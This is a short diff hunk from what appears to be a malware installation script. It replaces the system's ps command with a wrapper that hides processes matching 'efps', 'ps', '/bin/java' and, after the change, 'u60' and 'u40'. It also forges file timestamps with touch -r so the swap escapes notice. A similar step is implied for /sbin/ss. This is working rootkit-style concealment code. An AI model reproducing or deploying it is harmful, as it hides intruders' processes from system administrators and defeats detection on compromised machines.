@@ -39,6 +39,6 @@ touch -r /sbin/ntss /sbin/ss
 mv /bin/ps /bin/efps
 cd /bin/
 echo '#!/bin/bash
-/bin/efps $1 $2 $3 $4 $5 $6 | grep -Ev "efps|ps|/bin/java"' > /bin/ps
+/bin/efps $1 $2 $3 $4 $5 $6 | grep -Ev "efps|ps|/bin/java|u60|u40"' > /bin/ps
 chmod +x /bin/ps
 touch -r /bin/efps /bin/ps
